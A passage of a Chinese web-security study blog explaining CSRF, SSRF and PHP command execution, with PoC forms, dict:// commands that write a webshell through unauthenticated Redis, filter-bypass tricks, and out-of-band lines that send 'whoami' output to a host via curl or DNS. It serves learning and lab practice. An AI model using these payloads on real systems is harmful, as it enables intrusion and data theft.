<li><p>有<code>Referer</code></p>
<p>在<code>Medium</code>版本下的加了一行代码</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( stripos( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> )</span><br></pre></td></tr></table></div></figure>

<p>即检测<code>Referer</code>是否是服务器本身，<code>SERVER_NAME</code>表示运行脚本所在服务器的主机名。（如果只是浏览器输入<code>URL</code>访问的话，其<code>Referer</code>字段为空，链接的话则不会，会保存来源网站）</p>
<p>所以这里我们就需要进行抓包伪造<code>Referer</code>字段。</p>
</li>
<li><p>有<code>token</code></p>
<p>在<code>High</code>版本下添加了</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">checkToken( <span class="variable">$token</span>, <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"><span class="comment">//......</span></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br></pre></td></tr></table></div></figure>

<p>会检测用户传入的<code>token</code>，这是一个随机值，每次网站检测完之后会重新生成，然后将新的<code>token</code>发还给用户。</p>
<p>通常这种情况需要结合其他漏洞，比如<code>XSS</code>来获取相关的<code>token</code>值，即变成了<code>XSRF</code>。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&#x27; user. token&#x27;)[0].value</span><br></pre></td></tr></table></div></figure>

<p>即加载当前的<code>csrf</code>这个界面时，会弹出<code>token</code>值。当然，结合其他的手法可以直接获取<code>token</code>然后来伪造链接。</p>
</li>
</ul>

        <h4 id="POST型"   >
          <a href="#POST型" class="heading-link"><i class="fas fa-link"></i></a><a href="#POST型" class="headerlink" title="POST型"></a>POST型</h4>
      <p>需要构造<code>POC</code>，在<code>Burp suite</code>中可以<code>右键-&gt;Engagement tools-&gt;Generate CSRF Poc</code>，这样可以生成一个<code>form</code>表单形式来发生<code>POST</code>请求，对应修改相关字段即可。</p>
<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://www.baidu.com/&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;PIG-007&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();</span></span><br><span class="line"><span class="javascript">;        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>在添加<code>input</code>标签，然后添加对应需要的值即可</p>

        <h3 id="2-利用"   >
          <a href="#2-利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-利用" class="headerlink" title="(2)利用"></a>(2)利用</h3>
      <p>通常组合拳形式来<code>XSRF</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220610155923179.png" alt="image-20220610155923179"></p>

        <h3 id="3-防御"   >
          <a href="#3-防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-防御" class="headerlink" title="(3)防御"></a>(3)防御</h3>
      <ul>
<li>验证<code>Referer</code>和<code>token</code></li>
<li>在<code>HTTP</code>头部加入自定义属性验证</li>
<li>高危操作加入验证码</li>
<li>等等</li>
</ul>

        <h2 id="漏洞SSRF"   >
          <a href="#漏洞SSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞SSRF" class="headerlink" title="漏洞SSRF"></a>漏洞SSRF</h2>
      <p><code>SSRF</code>（<code>Server-side Request Forgery</code>）服务端请求伪造</p>
<p>比较常用的就是可以让服务器的相关敏感参数受到我们的控制，比如说我们可以传入一个<code>URL</code>让服务器去爬取，这个<code>URL</code>就是比较敏感的参数。</p>
<p>这样就可以绕过服务器的防火墙了。</p>

        <h3 id="1-可能存在的SSRF"   >
          <a href="#1-可能存在的SSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-可能存在的SSRF" class="headerlink" title="(1)可能存在的SSRF"></a>(1)可能存在的SSRF</h3>
      
        <h4 id="①功能服务"   >
          <a href="#①功能服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#①功能服务" class="headerlink" title="①功能服务"></a>①功能服务</h4>
      <p>以下的就可能存在<code>SSRF</code>漏洞</p>
<ul>
<li>请求远端资源</li>
<li>在线翻译</li>
<li>数据库内置功能</li>
<li>编码服务(?api=xxxx)</li>
<li><code>URL</code>网址调用</li>
<li>邮箱邮件</li>
</ul>

        <h4 id="②关键参数"   >
          <a href="#②关键参数" class="heading-link"><i class="fas fa-link"></i></a><a href="#②关键参数" class="headerlink" title="②关键参数"></a>②关键参数</h4>
      <p><code>share、target、wap、url、sourceURL、imageURL、source、domain</code>等</p>

        <h4 id="③关键函数"   >
          <a href="#③关键函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#③关键函数" class="headerlink" title="③关键函数"></a>③关键函数</h4>
      <ul>
<li><code>PHP</code>：<ul>
<li><code>file_get_contents()</code></li>
<li><code>fsockopen()</code></li>
<li><code>curl_exec()</code></li>
<li><code>fopen()</code></li>
</ul>
</li>
<li><code>Python</code>：<ul>
<li><code>urllib</code>库<code>http</code>头注入</li>
<li><code>requests</code>库中默认跟随<code>30x</code>跳转</li>
</ul>
</li>
</ul>

        <h3 id="2-利用-1"   >
          <a href="#2-利用-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-利用-1" class="headerlink" title="(2)利用"></a>(2)利用</h3>
      
        <h4 id="①相关协议"   >
          <a href="#①相关协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#①相关协议" class="headerlink" title="①相关协议"></a>①相关协议</h4>
      <ul>
<li><p><code>file</code>：访问本地文件的协议</p>
</li>
<li><p><code>http</code></p>
</li>
<li><p><code>dict</code>：字典服务器协议，基于查询响应的<code>TCP</code>协议。查询目标服务端口，需要服务具备<code>TCP</code>回显功能</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612113058963.png" alt="image-20220612113058963"></p>
<p>常见如下：</p>
<ul>
<li><code>http:80</code></li>
<li><code>https:433</code></li>
<li><code>ftp:20/21</code></li>
<li><code>mysql:3306</code></li>
<li><code>telnet:23</code></li>
<li><code>dns:53</code></li>
<li><code>dhcp:67/68</code></li>
<li><code>sshd:22</code></li>
<li><code>nginx:80</code></li>
<li><code>tomcat:8080</code></li>
<li><code>sql server:1433</code></li>
<li><code>oracle:1521</code></li>
<li><code>smtp:25</code></li>
<li><code>redis:6379</code></li>
</ul>
</li>
<li><p><code>gopher</code>：在<code>HTTP</code>协议之前的，在<code>Internet</code>上常见的协议，支持多行，常用来攻击内网。</p>
</li>
</ul>

        <h4 id="②获取敏感文件"   >
          <a href="#②获取敏感文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#②获取敏感文件" class="headerlink" title="②获取敏感文件"></a>②获取敏感文件</h4>
      <ul>
<li><p><code>Windows</code></p>
<ul>
<li><code>C:/windows/win.ini</code>：保存系统配置文件</li>
</ul>
</li>
<li><p><code>Linux</code></p>
<ul>
<li><p><code>file:///etc/passwd</code>：获取账号密码</p>
</li>
<li><p><code>file:///etc/hosts</code>：本网段的内网IP</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612112056049.png" alt="image-20220612112056049"></p>
<p>之后可以进行内网探测</p>
</li>
</ul>
</li>
</ul>

        <h4 id="③内网横向探测-WEB"   >
          <a href="#③内网横向探测-WEB" class="heading-link"><i class="fas fa-link"></i></a><a href="#③内网横向探测-WEB" class="headerlink" title="③内网横向探测-WEB"></a>③内网横向探测-WEB</h4>
      
        <h5 id="A-首先获取内网IP"   >
          <a href="#A-首先获取内网IP" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-首先获取内网IP" class="headerlink" title="A.首先获取内网IP"></a>A.首先获取内网<code>IP</code></h5>
      <p>使用<code>file</code>协议：<code>file:///etc/hosts</code>，但是在虚拟机里不知道怎么获取到对应的<code>docker的IP</code></p>
<p>这里假设本地搭建的虚拟机里面，<code>docker</code>和本虚拟机组成的一个子网</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612113904560.png" alt="image-20220612113904560"></p>
<p>即子网中其他的<code>docker的IP</code>就是<code>172.17.0.x</code></p>

        <h5 id="B-信息收集"   >
          <a href="#B-信息收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-信息收集" class="headerlink" title="B.信息收集"></a>B.信息收集</h5>
      <p>爆破子网存活主机及端口</p>
<p>在<code>BurpSuite</code>中将包发到<code>Intruder</code>，然后添加<code>$</code>进行重放，由于是需要爆破多个位置，那么就使用<code>Clusterbomb</code>模式</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612120816854.png" alt="image-20220612120816854"></p>
<p>之后在<code>Payload</code>上进行设置两个位置的爆破数值</p>
<p>第一个</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612120947874.png" alt="image-20220612120947874"></p>
<p>第二个</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612121049196.png" alt="image-20220612121049196"></p>
<p>开始攻击之后得到结果，依据对应的内容和长度来判断是否存在相关的服务</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612121321908.png" alt="image-20220612121321908"></p>

        <h5 id="C-内网穿透"   >
          <a href="#C-内网穿透" class="heading-link"><i class="fas fa-link"></i></a><a href="#C-内网穿透" class="headerlink" title="C.内网穿透"></a>C.内网穿透</h5>
      <p>利用<code>gopher</code>协议来利用构造两个数据包</p>
<ul>
<li>首先将第一个爬虫数据包抓取放到<code>Repeater</code></li>
</ul>

        <h4 id="③内网横向探测-Redis-未授权"   >
          <a href="#③内网横向探测-Redis-未授权" class="heading-link"><i class="fas fa-link"></i></a><a href="#③内网横向探测-Redis-未授权" class="headerlink" title="③内网横向探测-Redis-未授权"></a>③内网横向探测-Redis-未授权</h4>
      
        <h5 id="A-dict协议测试"   >
          <a href="#A-dict协议测试" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-dict协议测试" class="headerlink" title="A.dict协议测试"></a>A.<code>dict</code>协议测试</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://172.17.0.2:6379/</span><br></pre></td></tr></table></div></figure>

<p>返回如下<code>OK</code>即代表未授权即可访问，即没有密码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612174542324.png" alt="image-20220612174542324"></p>
<p>如果需要密码访问即如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612175006529.png" alt="image-20220612175006529"></p>

        <h5 id="B-写入木马"   >
          <a href="#B-写入木马" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-写入木马" class="headerlink" title="B.写入木马"></a>B.写入木马</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dict://172.17.0.2:6379/flushall</span><br><span class="line">dict://172.17.0.2:6379/config set dir /var/www  (网址根目录)</span><br><span class="line">dict://172.17.0.2:6379/config set dbfilename ssrf.php</span><br><span class="line">dict://172.17.0.2:6379/set webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br><span class="line">dict://172.17.0.2:6379/save</span><br></pre></td></tr></table></div></figure>




        <h2 id="XXE"   >
          <a href="#XXE" class="heading-link"><i class="fas fa-link"></i></a><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2>
      
        <h2 id="命令执行"   >
          <a href="#命令执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2>
      
        <h3 id="1-常用函数"   >
          <a href="#1-常用函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-常用函数" class="headerlink" title="(1)常用函数"></a>(1)常用函数</h3>
      
        <h4 id="①eval-函数"   >
          <a href="#①eval-函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#①eval-函数" class="headerlink" title="①eval()函数"></a>①<code>eval()</code>函数</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed eval(string $code);</span><br></pre></td></tr></table></div></figure>

<p>把字符串<code>code</code>当作<code>PHP</code>执行</p>
<ul>
<li><p>代码不能包含打开/关闭<code>PHP tags</code>，比如不能传入<code>&lt;?php echo &quot;Hi&quot;; ?&gt;</code>。但是可以利用闭合形式来关闭<code>PHP</code>再重新打开。比如</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;In PHP mode!&quot;; ?&gt; In HTML mode!&lt;?php echo &quot;Back in PHP mode!&quot;;</span><br></pre></td></tr></table></div></figure></li>
<li><p>传入的必须是有效的<code>PHP</code>代码，并且以分号<code>;</code>来进行语句分割，没有正常分割的话会导致一个<code>parse error</code>。</p>
</li>
</ul>

        <h4 id="②assert函数"   >
          <a href="#②assert函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#②assert函数" class="headerlink" title="②assert函数"></a>②<code>assert</code>函数</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool assert(mixed $assertion[,string $description])</span><br></pre></td></tr></table></div></figure>

<p><code>PHP</code>中用来判断一个表达式是否成立，返回布尔值。</p>
<p>如果<code>assertion</code>为字符串，那么它会被<code>assert()</code>当作<code>PHP</code>代码来执行。</p>

        <h4 id="③preg-replace函数"   >
          <a href="#③preg-replace函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#③preg-replace函数" class="headerlink" title="③preg_replace函数"></a>③<code>preg_replace</code>函数</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace(mixed $pattern,mixed $replacement,mixed $subject[,int $limit = -1[,int &amp;$count]])</span><br></pre></td></tr></table></div></figure>

<p>对字符串进行正则处理。搜索<code>subject</code>中匹配<code>pattern</code>的部分，以<code>replacement</code>来进行替换。当<code>$pattern</code>参数中存在<code>/e</code>修饰符时，<code>$replacement</code>的值会被当作<code>PHP</code>代码执行。</p>
<ul>
<li><code>PHP5.5.0</code>开始，传入<code>\e</code>修饰符会产生<code>E_DEPRECATED</code>错误，但是还是可以生效。而<code>PHP7.0.0</code>开始，会产生<code>E_WARNINIG</code>错误，同时<code>\e</code>无法生效</li>
</ul>
<p>如下代码，传入<code>_=phpinfo();</code>即可触发<code>phpinfo</code>函数</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo preg_replace(&#x27;/\s/e&#x27;,$_POST[_],$str);</span><br></pre></td></tr></table></div></figure>


        <h4 id="④调用函数过滤不当"   >
          <a href="#④调用函数过滤不当" class="heading-link"><i class="fas fa-link"></i></a><a href="#④调用函数过滤不当" class="headerlink" title="④调用函数过滤不当"></a>④调用函数过滤不当</h4>
      <p>通常用在框架中，小程序很少</p>
<p><code>call_user_func()、call_user_func_array()、array_map()</code>等几十个函数都可以调用其他函数的功能，其中第一个参数为调用的函数名称，如果这个函数名称可控，那么就可以调用任意函数。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed call_user_func(callable $callback[,mixed $paramenter[,mixed $....]])</span><br></pre></td></tr></table></div></figure>

<p>如下代码所示，传入<code>_assert</code>即可</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="variable">$_POST</span>[_],<span class="string">&#x27;phpinfo()&#x27;</span>);</span><br></pre></td></tr></table></div></figure>


        <h4 id="⑤动态函数执行"   >
          <a href="#⑤动态函数执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#⑤动态函数执行" class="headerlink" title="⑤动态函数执行"></a>⑤动态函数执行</h4>
      <p>可拼接字符串当作函数</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>.<span class="string">&#x27;s&#x27;</span>.<span class="string">&#x27;s&#x27;</span>.<span class="string">&#x27;e&#x27;</span>.<span class="string">&#x27;r&#x27;</span>.<span class="string">&#x27;t&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="string">&#x27;phpinfo()&#x27;</span>);</span><br></pre></td></tr></table></div></figure>

<p>或者</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&#x27;a&#x27;]($_POST[_]);</span><br></pre></td></tr></table></div></figure>

<p>那么传入<code>a=assert</code>和<code>_=phpinfo();</code>即可，但是不能传递<code>eval</code>。</p>

        <h4 id="⑥可用执行命令漏洞函数"   >
          <a href="#⑥可用执行命令漏洞函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#⑥可用执行命令漏洞函数" class="headerlink" title="⑥可用执行命令漏洞函数"></a>⑥可用执行命令漏洞函数</h4>
      <ul>
<li><p><code>string system(string $command[,int &amp;$return_var])</code></p>
<p>函数执行<code>command</code>参数所指定的命令，并且输出执行结果</p>
</li>
<li><p><code>string exec(string $command[,array &amp;$output[,int &amp;$return_var]])</code></p>
<p>执行<code>command</code>指定的命令</p>
</li>
<li><p><code>string shell_exec(string $cmd)</code></p>
<p>通过<code>shell</code>环境执行命令，将完整的输出以字符串形式返回。</p>
</li>
<li><p><code>void passthru(string $command[,int &amp;$return_var])</code></p>
<p>执行外部程序并且显示原始的输出</p>
</li>
<li><p>``反引号</p>
<p>利用<code>ls</code>，会被当作系统命令执行，其实就是<code>shell_exec()</code>函数进行处理。</p>
</li>
<li><p><code>void pcntl_exec(string $path[,array $args[,array $envs]])</code></p>
<p>多进程处理扩展，需要额外进行安装才行。</p>
</li>
<li><p><code>resource popen(string $command,string $mode)</code></p>
<p>打开一个指向进程的管道，该进程由给定的<code>command</code>命令产生。</p>
</li>
<li><p><code>resource proc_open(string $cmd,array $descriptorspec,array &amp;$pipes[,string $cwd[,array $env[,array $other_options]]])</code></p>
<p>更强大一些，但是需要指定更多的参数</p>
</li>
<li><p><code>bool ob_start([callback $output_callback[,int $chunk_size[,bool $erase]]])</code></p>
<p>控制输出缓冲的，相当于另外开辟一片缓冲区，可通过<code>ob_end_flush</code>来输出缓冲区</p>
<p>可选参数<code>$output_callback</code>被指定后，<code>ob_flush/ob_clean</code>或者类似的函数进行刷新时，会调用该回调函数，并且调用时输出缓冲区的内容会被当作参数去执行，并且返回一个新的缓冲区作为结果。</p>
</li>
</ul>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> shell_exec(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line">passthru(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> `whoami`;</span><br><span class="line">pcntl_exec(<span class="string">&quot;/bin/bash&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;whoami&#x27;</span>));</span><br><span class="line"></span><br><span class="line">popen(<span class="string">&#x27;whoami &gt;&gt; 123.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;1.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="number">0</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>)),</span><br><span class="line"><span class="number">1</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)),</span><br><span class="line"><span class="number">2</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;a&quot;</span>));</span><br><span class="line"><span class="comment">//控制标准输入输出和错误输出</span></span><br><span class="line">proc_open(<span class="string">&quot;whoami &gt;&gt; 1.txt&quot;</span>,<span class="variable">$descriptorspec</span>,<span class="variable">$pipes</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">ob_start(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$_GET</span>[a]&quot;</span>;</span><br><span class="line">ob_end_flush();<span class="comment">//会输出缓冲区内容</span></span><br><span class="line"><span class="comment">//传入为whoami即可执行命令</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="2-绕过"   >
          <a href="#2-绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-绕过" class="headerlink" title="(2)绕过"></a>(2)绕过</h3>
      <ul>
<li>命令方面</li>
</ul>
<p><code>&amp;</code>、<code>|</code>、<code>;</code>、<code>&amp;&amp;</code>、<code>||</code>之类的</p>
<ul>
<li><p>空格绕过</p>
<ul>
<li><p><code>IFS</code>，为<code>shell</code>的内置变量，用于分割字段，默认值为空(可当作空格、<code>tab</code>、换行)。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$&#123;IFS&#125;text</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>&#123;&#125;</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,text&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>tab</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat%09text</span><br></pre></td></tr></table></div></figure></li>
<li><p>重定向</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;text</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
<li><p>黑名单绕过</p>
<ul>
<li><p>拼接</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=tex;d=t;$a$b $&#123;c&#125;$&#123;d&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p>使用环境变量</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo $&#123;SHELLOPTS&#125;</span><br><span class="line">echo $&#123;SHELLOPTS:3:1&#125;</span><br><span class="line">&#123;SHELLOPTS:3:1&#125;at$&#123;IFS&#125;text</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613112926445.png" alt="image-20220613112926445"></p>
</li>
<li><p>使用空变量</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat t&#123;x&#125;ext</span><br></pre></td></tr></table></div></figure></li>
<li><p>使用通配符</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/ca? tex?</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613113027598.png" alt="image-20220613113027598"></p>
</li>
<li><p>使用反斜杠</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca\t tex\t</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613113106132.png" alt="image-20220613113106132"></p>
</li>
<li><p><code>base64</code>编码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo t|base64</span><br><span class="line">ca$(echo &quot;dAo=&quot;|base -d) text</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613113225371.png" alt="image-20220613113225371"></p>
</li>
</ul>
</li>
<li><p>无回显绕过</p>
<ul>
<li><p>使用<code>HTTP</code>通道带出数据</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl host/`whoami`</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613114812865.png" alt="image-20220613114812865"></p>
</li>
<li><p>使用<code>DNS</code>通道带出数据</p>
<p>一样的</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping `whoami`.host</span><br></pre></td></tr></table></div></figure></li>
<li><p>编码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl hosts/$(whoami|base64)</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h3 id="3-防御-1"   >
          <a href="#3-防御-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-防御-1" class="headerlink" title="(3)防御"></a>(3)防御</h3>
      <p>正则表达式白名单、过滤</p>

        <h2 id="漏洞JAVA反序列化"   >
          <a href="#漏洞JAVA反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞JAVA反序列化" class="headerlink" title="漏洞JAVA反序列化"></a>漏洞JAVA反序列化</h2>
      <p>从数据对象反序列化成内存对象的过程，主要是各种链子，有点困难，需要后续慢慢研究。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/04/15/CVE-2021-22555_Netfilter%E5%A0%86%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/">CVE-2021-22555</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-04-15</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-05-24</span></span></div></header><div class="post-body"><div class="post-excerpt">
